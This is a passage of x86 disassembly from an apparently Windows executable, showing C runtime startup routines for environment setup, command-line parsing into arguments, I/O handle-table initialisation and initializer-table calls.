  412886:	55                   	push   %ebp
  412887:	eb 2a                	jmp    0x4128b3
  412889:	56                   	push   %esi
  41288a:	e8 21 10 00 00       	call   0x4138b0
  41288f:	8b e8                	mov    %eax,%ebp
  412891:	45                   	inc    %ebp
  412892:	80 3e 3d             	cmpb   $0x3d,(%esi)
  412895:	59                   	pop    %ecx
  412896:	74 19                	je     0x4128b1
  412898:	55                   	push   %ebp
  412899:	e8 44 fa ff ff       	call   0x4122e2
  41289e:	3b c3                	cmp    %ebx,%eax
  4128a0:	59                   	pop    %ecx
  4128a1:	89 07                	mov    %eax,(%edi)
  4128a3:	74 37                	je     0x4128dc
  4128a5:	56                   	push   %esi
  4128a6:	50                   	push   %eax
  4128a7:	e8 94 10 00 00       	call   0x413940
  4128ac:	59                   	pop    %ecx
  4128ad:	59                   	pop    %ecx
  4128ae:	83 c7 04             	add    $0x4,%edi
  4128b1:	03 f5                	add    %ebp,%esi
  4128b3:	38 1e                	cmp    %bl,(%esi)
  4128b5:	75 d2                	jne    0x412889
  4128b7:	ff 35 7c 6c 45 00    	push   0x456c7c
  4128bd:	e8 08 f9 ff ff       	call   0x4121ca
  4128c2:	89 1d 7c 6c 45 00    	mov    %ebx,0x456c7c
  4128c8:	89 1f                	mov    %ebx,(%edi)
  4128ca:	c7 05 60 74 45 00 01 	movl   $0x1,0x457460
  4128d1:	00 00 00 
  4128d4:	33 c0                	xor    %eax,%eax
  4128d6:	59                   	pop    %ecx
  4128d7:	5d                   	pop    %ebp
  4128d8:	5f                   	pop    %edi
  4128d9:	5e                   	pop    %esi
  4128da:	5b                   	pop    %ebx
  4128db:	c3                   	ret
  4128dc:	ff 35 ac 6c 45 00    	push   0x456cac
  4128e2:	e8 e3 f8 ff ff       	call   0x4121ca
  4128e7:	89 1d ac 6c 45 00    	mov    %ebx,0x456cac
  4128ed:	83 c8 ff             	or     $0xffffffff,%eax
  4128f0:	eb e4                	jmp    0x4128d6
  4128f2:	55                   	push   %ebp
  4128f3:	8b ec                	mov    %esp,%ebp
  4128f5:	51                   	push   %ecx
  4128f6:	53                   	push   %ebx
  4128f7:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4128fa:	33 d2                	xor    %edx,%edx
  4128fc:	39 55 08             	cmp    %edx,0x8(%ebp)
  4128ff:	57                   	push   %edi
  412900:	89 16                	mov    %edx,(%esi)
  412902:	8b f9                	mov    %ecx,%edi
  412904:	c7 03 01 00 00 00    	movl   $0x1,(%ebx)
  41290a:	74 09                	je     0x412915
  41290c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  41290f:	83 45 08 04          	addl   $0x4,0x8(%ebp)
  412913:	89 39                	mov    %edi,(%ecx)
  412915:	80 38 22             	cmpb   $0x22,(%eax)
  412918:	75 0e                	jne    0x412928
  41291a:	33 c9                	xor    %ecx,%ecx
  41291c:	85 d2                	test   %edx,%edx
  41291e:	0f 94 c1             	sete   %cl
  412921:	40                   	inc    %eax
  412922:	8b d1                	mov    %ecx,%edx
  412924:	b1 22                	mov    $0x22,%cl
  412926:	eb 2d                	jmp    0x412955
  412928:	ff 06                	incl   (%esi)
  41292a:	85 ff                	test   %edi,%edi
  41292c:	74 05                	je     0x412933
  41292e:	8a 08                	mov    (%eax),%cl
  412930:	88 0f                	mov    %cl,(%edi)
  412932:	47                   	inc    %edi
  412933:	8a 08                	mov    (%eax),%cl
  412935:	0f b6 d9             	movzbl %cl,%ebx
  412938:	40                   	inc    %eax
  412939:	f6 83 01 71 45 00 04 	testb  $0x4,0x457101(%ebx)
  412940:	74 0c                	je     0x41294e
  412942:	ff 06                	incl   (%esi)
  412944:	85 ff                	test   %edi,%edi
  412946:	74 05                	je     0x41294d
  412948:	8a 18                	mov    (%eax),%bl
  41294a:	88 1f                	mov    %bl,(%edi)
  41294c:	47                   	inc    %edi
  41294d:	40                   	inc    %eax
  41294e:	84 c9                	test   %cl,%cl
  412950:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  412953:	74 32                	je     0x412987
  412955:	85 d2                	test   %edx,%edx
  412957:	75 bc                	jne    0x412915
  412959:	80 f9 20             	cmp    $0x20,%cl
  41295c:	74 05                	je     0x412963
  41295e:	80 f9 09             	cmp    $0x9,%cl
  412961:	75 b2                	jne    0x412915
  412963:	85 ff                	test   %edi,%edi
  412965:	74 04                	je     0x41296b
  412967:	80 67 ff 00          	andb   $0x0,-0x1(%edi)
  41296b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  41296f:	80 38 00             	cmpb   $0x0,(%eax)
  412972:	0f 84 d6 00 00 00    	je     0x412a4e
  412978:	8a 08                	mov    (%eax),%cl
  41297a:	80 f9 20             	cmp    $0x20,%cl
  41297d:	74 05                	je     0x412984
  41297f:	80 f9 09             	cmp    $0x9,%cl
  412982:	75 06                	jne    0x41298a
  412984:	40                   	inc    %eax
  412985:	eb f1                	jmp    0x412978
  412987:	48                   	dec    %eax
  412988:	eb e1                	jmp    0x41296b
  41298a:	80 38 00             	cmpb   $0x0,(%eax)
  41298d:	0f 84 bb 00 00 00    	je     0x412a4e
  412993:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  412997:	74 09                	je     0x4129a2
  412999:	8b 4d 08             	mov    0x8(%ebp),%ecx
  41299c:	83 45 08 04          	addl   $0x4,0x8(%ebp)
  4129a0:	89 39                	mov    %edi,(%ecx)
  4129a2:	ff 03                	incl   (%ebx)
  4129a4:	33 db                	xor    %ebx,%ebx
  4129a6:	43                   	inc    %ebx
  4129a7:	33 d2                	xor    %edx,%edx
  4129a9:	eb 02                	jmp    0x4129ad
  4129ab:	40                   	inc    %eax
  4129ac:	42                   	inc    %edx
  4129ad:	80 38 5c             	cmpb   $0x5c,(%eax)
  4129b0:	74 f9                	je     0x4129ab
  4129b2:	80 38 22             	cmpb   $0x22,(%eax)
  4129b5:	75 26                	jne    0x4129dd
  4129b7:	f6 c2 01             	test   $0x1,%dl
  4129ba:	75 1f                	jne    0x4129db
  4129bc:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4129c0:	74 0c                	je     0x4129ce
  4129c2:	8d 48 01             	lea    0x1(%eax),%ecx
  4129c5:	80 39 22             	cmpb   $0x22,(%ecx)
  4129c8:	75 04                	jne    0x4129ce
  4129ca:	8b c1                	mov    %ecx,%eax
  4129cc:	eb 02                	jmp    0x4129d0
  4129ce:	33 db                	xor    %ebx,%ebx
  4129d0:	33 c9                	xor    %ecx,%ecx
  4129d2:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  4129d5:	0f 94 c1             	sete   %cl
  4129d8:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4129db:	d1 ea                	shr    %edx
  4129dd:	85 d2                	test   %edx,%edx
  4129df:	74 0d                	je     0x4129ee
  4129e1:	85 ff                	test   %edi,%edi
  4129e3:	74 04                	je     0x4129e9
  4129e5:	c6 07 5c             	movb   $0x5c,(%edi)
  4129e8:	47                   	inc    %edi
  4129e9:	ff 06                	incl   (%esi)
  4129eb:	4a                   	dec    %edx
  4129ec:	75 f3                	jne    0x4129e1
  4129ee:	8a 08                	mov    (%eax),%cl
  4129f0:	84 c9                	test   %cl,%cl
  4129f2:	74 48                	je     0x412a3c
  4129f4:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4129f8:	75 0a                	jne    0x412a04
  4129fa:	80 f9 20             	cmp    $0x20,%cl
  4129fd:	74 3d                	je     0x412a3c
  4129ff:	80 f9 09             	cmp    $0x9,%cl
  412a02:	74 38                	je     0x412a3c
  412a04:	85 db                	test   %ebx,%ebx
  412a06:	74 2e                	je     0x412a36
  412a08:	85 ff                	test   %edi,%edi
  412a0a:	74 19                	je     0x412a25
  412a0c:	0f b6 d1             	movzbl %cl,%edx
  412a0f:	f6 82 01 71 45 00 04 	testb  $0x4,0x457101(%edx)
  412a16:	74 06                	je     0x412a1e
  412a18:	88 0f                	mov    %cl,(%edi)
  412a1a:	47                   	inc    %edi
  412a1b:	40                   	inc    %eax
  412a1c:	ff 06                	incl   (%esi)
  412a1e:	8a 08                	mov    (%eax),%cl
  412a20:	88 0f                	mov    %cl,(%edi)
  412a22:	47                   	inc    %edi
  412a23:	eb 0f                	jmp    0x412a34
  412a25:	0f b6 c9             	movzbl %cl,%ecx
  412a28:	f6 81 01 71 45 00 04 	testb  $0x4,0x457101(%ecx)
  412a2f:	74 03                	je     0x412a34
  412a31:	40                   	inc    %eax
  412a32:	ff 06                	incl   (%esi)
  412a34:	ff 06                	incl   (%esi)
  412a36:	40                   	inc    %eax
  412a37:	e9 68 ff ff ff       	jmp    0x4129a4
  412a3c:	85 ff                	test   %edi,%edi
  412a3e:	74 04                	je     0x412a44
  412a40:	80 27 00             	andb   $0x0,(%edi)
  412a43:	47                   	inc    %edi
  412a44:	ff 06                	incl   (%esi)
  412a46:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  412a49:	e9 21 ff ff ff       	jmp    0x41296f
  412a4e:	8b 45 08             	mov    0x8(%ebp),%eax
  412a51:	85 c0                	test   %eax,%eax
  412a53:	74 03                	je     0x412a58
  412a55:	83 20 00             	andl   $0x0,(%eax)
  412a58:	ff 03                	incl   (%ebx)
  412a5a:	5f                   	pop    %edi
  412a5b:	5b                   	pop    %ebx
  412a5c:	c9                   	leave
  412a5d:	c3                   	ret
  412a5e:	55                   	push   %ebp
  412a5f:	8b ec                	mov    %esp,%ebp
  412a61:	51                   	push   %ecx
  412a62:	51                   	push   %ecx
  412a63:	53                   	push   %ebx
  412a64:	56                   	push   %esi
  412a65:	57                   	push   %edi
  412a66:	33 ff                	xor    %edi,%edi
  412a68:	39 3d 6c 74 45 00    	cmp    %edi,0x45746c
  412a6e:	75 05                	jne    0x412a75
  412a70:	e8 41 28 00 00       	call   0x4152b6
  412a75:	80 25 dc 6d 45 00 00 	andb   $0x0,0x456ddc
  412a7c:	68 04 01 00 00       	push   $0x104
  412a81:	be d8 6c 45 00       	mov    $0x456cd8,%esi
  412a86:	56                   	push   %esi
  412a87:	57                   	push   %edi
  412a88:	ff 15 a0 80 41 00    	call   *0x4180a0
  412a8e:	a1 70 74 45 00       	mov    0x457470,%eax
  412a93:	3b c7                	cmp    %edi,%eax
  412a95:	89 35 bc 6c 45 00    	mov    %esi,0x456cbc
  412a9b:	74 07                	je     0x412aa4
  412a9d:	80 38 00             	cmpb   $0x0,(%eax)
  412aa0:	8b d8                	mov    %eax,%ebx
  412aa2:	75 02                	jne    0x412aa6
  412aa4:	8b de                	mov    %esi,%ebx
  412aa6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  412aa9:	50                   	push   %eax
  412aaa:	57                   	push   %edi
  412aab:	8d 75 f8             	lea    -0x8(%ebp),%esi
  412aae:	33 c9                	xor    %ecx,%ecx
  412ab0:	8b c3                	mov    %ebx,%eax
  412ab2:	e8 3b fe ff ff       	call   0x4128f2
  412ab7:	8b 75 fc             	mov    -0x4(%ebp),%esi
  412aba:	8b 45 f8             	mov    -0x8(%ebp),%eax
  412abd:	c1 e6 02             	shl    $0x2,%esi
  412ac0:	03 c6                	add    %esi,%eax
  412ac2:	50                   	push   %eax
  412ac3:	e8 1a f8 ff ff       	call   0x4122e2
  412ac8:	8b f8                	mov    %eax,%edi
  412aca:	83 c4 0c             	add    $0xc,%esp
  412acd:	85 ff                	test   %edi,%edi
  412acf:	75 05                	jne    0x412ad6
  412ad1:	83 c8 ff             	or     $0xffffffff,%eax
  412ad4:	eb 25                	jmp    0x412afb
  412ad6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  412ad9:	50                   	push   %eax
  412ada:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  412add:	57                   	push   %edi
  412ade:	8d 75 f8             	lea    -0x8(%ebp),%esi
  412ae1:	8b c3                	mov    %ebx,%eax
  412ae3:	e8 0a fe ff ff       	call   0x4128f2
  412ae8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  412aeb:	48                   	dec    %eax
  412aec:	59                   	pop    %ecx
  412aed:	a3 a0 6c 45 00       	mov    %eax,0x456ca0
  412af2:	59                   	pop    %ecx
  412af3:	89 3d a4 6c 45 00    	mov    %edi,0x456ca4
  412af9:	33 c0                	xor    %eax,%eax
  412afb:	5f                   	pop    %edi
  412afc:	5e                   	pop    %esi
  412afd:	5b                   	pop    %ebx
  412afe:	c9                   	leave
  412aff:	c3                   	ret
  412b00:	51                   	push   %ecx
  412b01:	51                   	push   %ecx
  412b02:	a1 e0 6d 45 00       	mov    0x456de0,%eax
  412b07:	53                   	push   %ebx
  412b08:	55                   	push   %ebp
  412b09:	56                   	push   %esi
  412b0a:	57                   	push   %edi
  412b0b:	8b 3d b8 80 41 00    	mov    0x4180b8,%edi
  412b11:	33 db                	xor    %ebx,%ebx
  412b13:	33 f6                	xor    %esi,%esi
  412b15:	3b c3                	cmp    %ebx,%eax
  412b17:	6a 02                	push   $0x2
  412b19:	5d                   	pop    %ebp
  412b1a:	75 2d                	jne    0x412b49
  412b1c:	ff d7                	call   *%edi
  412b1e:	8b f0                	mov    %eax,%esi
  412b20:	3b f3                	cmp    %ebx,%esi
  412b22:	74 0c                	je     0x412b30
  412b24:	c7 05 e0 6d 45 00 01 	movl   $0x1,0x456de0
  412b2b:	00 00 00 
  412b2e:	eb 1e                	jmp    0x412b4e
  412b30:	ff 15 2c 80 41 00    	call   *0x41802c
  412b36:	83 f8 78             	cmp    $0x78,%eax
  412b39:	75 09                	jne    0x412b44
  412b3b:	8b c5                	mov    %ebp,%eax
  412b3d:	a3 e0 6d 45 00       	mov    %eax,0x456de0
  412b42:	eb 05                	jmp    0x412b49
  412b44:	a1 e0 6d 45 00       	mov    0x456de0,%eax
  412b49:	83 f8 01             	cmp    $0x1,%eax
  412b4c:	75 7d                	jne    0x412bcb
  412b4e:	3b f3                	cmp    %ebx,%esi
  412b50:	75 08                	jne    0x412b5a
  412b52:	ff d7                	call   *%edi
  412b54:	8b f0                	mov    %eax,%esi
  412b56:	3b f3                	cmp    %ebx,%esi
  412b58:	74 79                	je     0x412bd3
  412b5a:	66 39 1e             	cmp    %bx,(%esi)
  412b5d:	8b c6                	mov    %esi,%eax
  412b5f:	74 0e                	je     0x412b6f
  412b61:	03 c5                	add    %ebp,%eax
  412b63:	66 39 18             	cmp    %bx,(%eax)
  412b66:	75 f9                	jne    0x412b61
  412b68:	03 c5                	add    %ebp,%eax
  412b6a:	66 39 18             	cmp    %bx,(%eax)
  412b6d:	75 f2                	jne    0x412b61
  412b6f:	8b 3d b4 80 41 00    	mov    0x4180b4,%edi
  412b75:	53                   	push   %ebx
  412b76:	53                   	push   %ebx
  412b77:	53                   	push   %ebx
  412b78:	2b c6                	sub    %esi,%eax
  412b7a:	53                   	push   %ebx
  412b7b:	d1 f8                	sar    %eax
  412b7d:	40                   	inc    %eax
  412b7e:	50                   	push   %eax
  412b7f:	56                   	push   %esi
  412b80:	53                   	push   %ebx
  412b81:	53                   	push   %ebx
  412b82:	89 44 24 34          	mov    %eax,0x34(%esp)
  412b86:	ff d7                	call   *%edi
  412b88:	8b e8                	mov    %eax,%ebp
  412b8a:	3b eb                	cmp    %ebx,%ebp
  412b8c:	74 32                	je     0x412bc0
  412b8e:	55                   	push   %ebp
  412b8f:	e8 4e f7 ff ff       	call   0x4122e2
  412b94:	3b c3                	cmp    %ebx,%eax
  412b96:	59                   	pop    %ecx
  412b97:	89 44 24 10          	mov    %eax,0x10(%esp)
  412b9b:	74 23                	je     0x412bc0
  412b9d:	53                   	push   %ebx
  412b9e:	53                   	push   %ebx
  412b9f:	55                   	push   %ebp
  412ba0:	50                   	push   %eax
  412ba1:	ff 74 24 24          	push   0x24(%esp)
  412ba5:	56                   	push   %esi
  412ba6:	53                   	push   %ebx
  412ba7:	53                   	push   %ebx
  412ba8:	ff d7                	call   *%edi
  412baa:	85 c0                	test   %eax,%eax
  412bac:	75 0e                	jne    0x412bbc
  412bae:	ff 74 24 10          	push   0x10(%esp)
  412bb2:	e8 13 f6 ff ff       	call   0x4121ca
  412bb7:	59                   	pop    %ecx
  412bb8:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  412bbc:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  412bc0:	56                   	push   %esi
  412bc1:	ff 15 b0 80 41 00    	call   *0x4180b0
  412bc7:	8b c3                	mov    %ebx,%eax
  412bc9:	eb 50                	jmp    0x412c1b
  412bcb:	3b c5                	cmp    %ebp,%eax
  412bcd:	74 08                	je     0x412bd7
  412bcf:	3b c3                	cmp    %ebx,%eax
  412bd1:	74 04                	je     0x412bd7
  412bd3:	33 c0                	xor    %eax,%eax
  412bd5:	eb 44                	jmp    0x412c1b
  412bd7:	ff 15 ac 80 41 00    	call   *0x4180ac
  412bdd:	8b f0                	mov    %eax,%esi
  412bdf:	3b f3                	cmp    %ebx,%esi
  412be1:	74 f0                	je     0x412bd3
  412be3:	38 1e                	cmp    %bl,(%esi)
  412be5:	74 0a                	je     0x412bf1
  412be7:	40                   	inc    %eax
  412be8:	38 18                	cmp    %bl,(%eax)
  412bea:	75 fb                	jne    0x412be7
  412bec:	40                   	inc    %eax
  412bed:	38 18                	cmp    %bl,(%eax)
  412bef:	75 f6                	jne    0x412be7
  412bf1:	2b c6                	sub    %esi,%eax
  412bf3:	40                   	inc    %eax
  412bf4:	8b e8                	mov    %eax,%ebp
  412bf6:	55                   	push   %ebp
  412bf7:	e8 e6 f6 ff ff       	call   0x4122e2
  412bfc:	8b f8                	mov    %eax,%edi
  412bfe:	3b fb                	cmp    %ebx,%edi
  412c00:	59                   	pop    %ecx
  412c01:	75 04                	jne    0x412c07
  412c03:	33 ff                	xor    %edi,%edi
  412c05:	eb 0b                	jmp    0x412c12
  412c07:	55                   	push   %ebp
  412c08:	56                   	push   %esi
  412c09:	57                   	push   %edi
  412c0a:	e8 d1 26 00 00       	call   0x4152e0
  412c0f:	83 c4 0c             	add    $0xc,%esp
  412c12:	56                   	push   %esi
  412c13:	ff 15 a8 80 41 00    	call   *0x4180a8
  412c19:	8b c7                	mov    %edi,%eax
  412c1b:	5f                   	pop    %edi
  412c1c:	5e                   	pop    %esi
  412c1d:	5d                   	pop    %ebp
  412c1e:	5b                   	pop    %ebx
  412c1f:	59                   	pop    %ecx
  412c20:	59                   	pop    %ecx
  412c21:	c3                   	ret
  412c22:	83 ec 48             	sub    $0x48,%esp
  412c25:	53                   	push   %ebx
  412c26:	bb 80 04 00 00       	mov    $0x480,%ebx
  412c2b:	53                   	push   %ebx
  412c2c:	e8 b1 f6 ff ff       	call   0x4122e2
  412c31:	85 c0                	test   %eax,%eax
  412c33:	59                   	pop    %ecx
  412c34:	75 08                	jne    0x412c3e
  412c36:	83 c8 ff             	or     $0xffffffff,%eax
  412c39:	e9 dd 01 00 00       	jmp    0x412e1b
  412c3e:	a3 60 73 45 00       	mov    %eax,0x457360
  412c43:	c7 05 44 73 45 00 20 	movl   $0x20,0x457344
  412c4a:	00 00 00 
  412c4d:	8d 88 80 04 00 00    	lea    0x480(%eax),%ecx
  412c53:	eb 1e                	jmp    0x412c73
  412c55:	80 60 04 00          	andb   $0x0,0x4(%eax)
  412c59:	83 08 ff             	orl    $0xffffffff,(%eax)
  412c5c:	83 60 08 00          	andl   $0x0,0x8(%eax)
  412c60:	c6 40 05 0a          	movb   $0xa,0x5(%eax)
  412c64:	8b 0d 60 73 45 00    	mov    0x457360,%ecx
  412c6a:	83 c0 24             	add    $0x24,%eax
  412c6d:	81 c1 80 04 00 00    	add    $0x480,%ecx
  412c73:	3b c1                	cmp    %ecx,%eax
  412c75:	72 de                	jb     0x412c55
  412c77:	55                   	push   %ebp
  412c78:	56                   	push   %esi
  412c79:	57                   	push   %edi
  412c7a:	8d 44 24 14          	lea    0x14(%esp),%eax
  412c7e:	50                   	push   %eax
  412c7f:	ff 15 7c 80 41 00    	call   *0x41807c
  412c85:	66 83 7c 24 46 00    	cmpw   $0x0,0x46(%esp)
  412c8b:	0f 84 e9 00 00 00    	je     0x412d7a
  412c91:	8b 44 24 48          	mov    0x48(%esp),%eax
  412c95:	85 c0                	test   %eax,%eax
  412c97:	0f 84 dd 00 00 00    	je     0x412d7a
  412c9d:	8b 38                	mov    (%eax),%edi
  412c9f:	8d 68 04             	lea    0x4(%eax),%ebp
  412ca2:	8d 04 2f             	lea    (%edi,%ebp,1),%eax
  412ca5:	89 44 24 10          	mov    %eax,0x10(%esp)
  412ca9:	b8 00 08 00 00       	mov    $0x800,%eax
  412cae:	3b f8                	cmp    %eax,%edi
  412cb0:	7c 02                	jl     0x412cb4
  412cb2:	8b f8                	mov    %eax,%edi
  412cb4:	39 3d 44 73 45 00    	cmp    %edi,0x457344
  412cba:	7d 4e                	jge    0x412d0a
  412cbc:	be 64 73 45 00       	mov    $0x457364,%esi
  412cc1:	53                   	push   %ebx
  412cc2:	e8 1b f6 ff ff       	call   0x4122e2
  412cc7:	85 c0                	test   %eax,%eax
  412cc9:	59                   	pop    %ecx
  412cca:	74 38                	je     0x412d04
  412ccc:	83 05 44 73 45 00 20 	addl   $0x20,0x457344
  412cd3:	89 06                	mov    %eax,(%esi)
  412cd5:	8d 88 80 04 00 00    	lea    0x480(%eax),%ecx
  412cdb:	eb 16                	jmp    0x412cf3
  412cdd:	80 60 04 00          	andb   $0x0,0x4(%eax)
  412ce1:	83 08 ff             	orl    $0xffffffff,(%eax)
  412ce4:	83 60 08 00          	andl   $0x0,0x8(%eax)
  412ce8:	c6 40 05 0a          	movb   $0xa,0x5(%eax)
  412cec:	8b 0e                	mov    (%esi),%ecx
  412cee:	83 c0 24             	add    $0x24,%eax
  412cf1:	03 cb                	add    %ebx,%ecx
  412cf3:	3b c1                	cmp    %ecx,%eax
  412cf5:	72 e6                	jb     0x412cdd
  412cf7:	83 c6 04             	add    $0x4,%esi
  412cfa:	39 3d 44 73 45 00    	cmp    %edi,0x457344
  412d00:	7c bf                	jl     0x412cc1
  412d02:	eb 06                	jmp    0x412d0a
  412d04:	8b 3d 44 73 45 00    	mov    0x457344,%edi
  412d0a:	33 db                	xor    %ebx,%ebx
  412d0c:	85 ff                	test   %edi,%edi
  412d0e:	7e 6a                	jle    0x412d7a
  412d10:	8b 44 24 10          	mov    0x10(%esp),%eax
  412d14:	8b 00                	mov    (%eax),%eax
  412d16:	83 f8 ff             	cmp    $0xffffffff,%eax
  412d19:	74 54                	je     0x412d6f
  412d1b:	8a 4d 00             	mov    0x0(%ebp),%cl
  412d1e:	f6 c1 01             	test   $0x1,%cl
  412d21:	74 4c                	je     0x412d6f
  412d23:	f6 c1 08             	test   $0x8,%cl
  412d26:	75 0b                	jne    0x412d33
  412d28:	50                   	push   %eax
  412d29:	ff 15 c0 80 41 00    	call   *0x4180c0
  412d2f:	85 c0                	test   %eax,%eax
  412d31:	74 3c                	je     0x412d6f
  412d33:	8b cb                	mov    %ebx,%ecx
  412d35:	8b c3                	mov    %ebx,%eax
  412d37:	83 e0 1f             	and    $0x1f,%eax
  412d3a:	8d 04 c0             	lea    (%eax,%eax,8),%eax
  412d3d:	c1 f9 05             	sar    $0x5,%ecx
  412d40:	8b 0c 8d 60 73 45 00 	mov    0x457360(,%ecx,4),%ecx
  412d47:	8d 34 81             	lea    (%ecx,%eax,4),%esi
  412d4a:	8b 44 24 10          	mov    0x10(%esp),%eax
  412d4e:	8b 00                	mov    (%eax),%eax
  412d50:	89 06                	mov    %eax,(%esi)
  412d52:	8a 45 00             	mov    0x0(%ebp),%al
  412d55:	88 46 04             	mov    %al,0x4(%esi)
  412d58:	8d 46 0c             	lea    0xc(%esi),%eax
  412d5b:	68 a0 0f 00 00       	push   $0xfa0
  412d60:	50                   	push   %eax
  412d61:	e8 c7 28 00 00       	call   0x41562d
  412d66:	85 c0                	test   %eax,%eax
  412d68:	59                   	pop    %ecx
  412d69:	59                   	pop    %ecx
  412d6a:	74 2e                	je     0x412d9a
  412d6c:	ff 46 08             	incl   0x8(%esi)
  412d6f:	83 44 24 10 04       	addl   $0x4,0x10(%esp)
  412d74:	43                   	inc    %ebx
  412d75:	45                   	inc    %ebp
  412d76:	3b df                	cmp    %edi,%ebx
  412d78:	7c 96                	jl     0x412d10
  412d7a:	33 db                	xor    %ebx,%ebx
  412d7c:	8b 0d 60 73 45 00    	mov    0x457360,%ecx
  412d82:	8d 04 db             	lea    (%ebx,%ebx,8),%eax
  412d85:	8d 34 81             	lea    (%ecx,%eax,4),%esi
  412d88:	83 3e ff             	cmpl   $0xffffffff,(%esi)
  412d8b:	75 6f                	jne    0x412dfc
  412d8d:	85 db                	test   %ebx,%ebx
  412d8f:	c6 46 04 81          	movb   $0x81,0x4(%esi)
  412d93:	75 0a                	jne    0x412d9f
  412d95:	6a f6                	push   $0xfffffff6
  412d97:	58                   	pop    %eax
  412d98:	eb 0f                	jmp    0x412da9
  412d9a:	83 c8 ff             	or     $0xffffffff,%eax
  412d9d:	eb 79                	jmp    0x412e18
  412d9f:	8b c3                	mov    %ebx,%eax
  412da1:	48                   	dec    %eax
  412da2:	f7 d8                	neg    %eax
  412da4:	1b c0                	sbb    %eax,%eax
  412da6:	83 c0 f5             	add    $0xfffffff5,%eax
  412da9:	50                   	push   %eax
  412daa:	ff 15 9c 80 41 00    	call   *0x41809c
  412db0:	8b f8                	mov    %eax,%edi
  412db2:	83 ff ff             	cmp    $0xffffffff,%edi
  412db5:	74 3f                	je     0x412df6
  412db7:	57                   	push   %edi
  412db8:	ff 15 c0 80 41 00    	call   *0x4180c0
  412dbe:	85 c0                	test   %eax,%eax
  412dc0:	74 34                	je     0x412df6
  412dc2:	25 ff 00 00 00       	and    $0xff,%eax
  412dc7:	83 f8 02             	cmp    $0x2,%eax
  412dca:	89 3e                	mov    %edi,(%esi)
  412dcc:	75 06                	jne    0x412dd4
  412dce:	80 4e 04 40          	orb    $0x40,0x4(%esi)
  412dd2:	eb 09                	jmp    0x412ddd
  412dd4:	83 f8 03             	cmp    $0x3,%eax
  412dd7:	75 04                	jne    0x412ddd
  412dd9:	80 4e 04 08          	orb    $0x8,0x4(%esi)
  412ddd:	8d 46 0c             	lea    0xc(%esi),%eax
  412de0:	68 a0 0f 00 00       	push   $0xfa0
  412de5:	50                   	push   %eax
  412de6:	e8 42 28 00 00       	call   0x41562d
  412deb:	85 c0                	test   %eax,%eax
  412ded:	59                   	pop    %ecx
  412dee:	59                   	pop    %ecx
  412def:	74 a9                	je     0x412d9a
  412df1:	ff 46 08             	incl   0x8(%esi)
  412df4:	eb 0a                	jmp    0x412e00
  412df6:	80 4e 04 40          	orb    $0x40,0x4(%esi)
  412dfa:	eb 04                	jmp    0x412e00
  412dfc:	80 4e 04 80          	orb    $0x80,0x4(%esi)
  412e00:	43                   	inc    %ebx
  412e01:	83 fb 03             	cmp    $0x3,%ebx
  412e04:	0f 8c 72 ff ff ff    	jl     0x412d7c
  412e0a:	ff 35 44 73 45 00    	push   0x457344
  412e10:	ff 15 bc 80 41 00    	call   *0x4180bc
  412e16:	33 c0                	xor    %eax,%eax
  412e18:	5f                   	pop    %edi
  412e19:	5e                   	pop    %esi
  412e1a:	5d                   	pop    %ebp
  412e1b:	5b                   	pop    %ebx
  412e1c:	83 c4 48             	add    $0x48,%esp
  412e1f:	c3                   	ret
  412e20:	6a 0c                	push   $0xc
  412e22:	68 80 85 41 00       	push   $0x418580
  412e27:	e8 e8 01 00 00       	call   0x413014
  412e2c:	c7 45 e4 d8 8f 41 00 	movl   $0x418fd8,-0x1c(%ebp)
  412e33:	81 7d e4 d8 8f 41 00 	cmpl   $0x418fd8,-0x1c(%ebp)
  412e3a:	73 22                	jae    0x412e5e
  412e3c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  412e40:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  412e43:	8b 00                	mov    (%eax),%eax
  412e45:	85 c0                	test   %eax,%eax
  412e47:	74 0b                	je     0x412e54
  412e49:	ff d0                	call   *%eax
  412e4b:	eb 07                	jmp    0x412e54
  412e4d:	33 c0                	xor    %eax,%eax
  412e4f:	40                   	inc    %eax
  412e50:	c3                   	ret
  412e51:	8b 65 e8             	mov    -0x18(%ebp),%esp
  412e54:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  412e58:	83 45 e4 04          	addl   $0x4,-0x1c(%ebp)
  412e5c:	eb d5                	jmp    0x412e33
  412e5e:	e8 ec 01 00 00       	call   0x41304f
  412e63:	c3                   	ret
  412e64:	6a 0c                	push   $0xc
  412e66:	68 90 85 41 00       	push   $0x418590
  412e6b:	e8 a4 01 00 00       	call   0x413014
  412e70:	c7 45 e4 e0 8f 41 00 	movl   $0x418fe0,-0x1c(%ebp)
  412e77:	81 7d e4 e0 8f 41 00 	cmpl   $0x418fe0,-0x1c(%ebp)
  412e7e:	73 22                	jae    0x412ea2
  412e80:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  412e84:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  412e87:	8b 00                	mov    (%eax),%eax
  412e89:	85 c0                	test   %eax,%eax
  412e8b:	74 0b                	je     0x412e98
  412e8d:	ff d0                	call   *%eax
  412e8f:	eb 07                	jmp    0x412e98
  412e91:	33 c0                	xor    %eax,%eax
  412e93:	40                   	inc    %eax
  412e94:	c3                   	ret
  412e95:	8b 65 e8             	mov    -0x18(%ebp),%esp
  412e98:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  412e9c:	83 45 e4 04          	addl   $0x4,-0x1c(%ebp)
  412ea0:	eb d5                	jmp    0x412e77
  412ea2:	e8 a8 01 00 00       	call   0x41304f
  412ea7:	c3                   	ret
  412ea8:	e8 8d 0f 00 00       	call   0x413e3a
  412ead:	a1 bc 61 45 00       	mov    0x4561bc,%eax
  412eb2:	83 f8 ff             	cmp    $0xffffffff,%eax
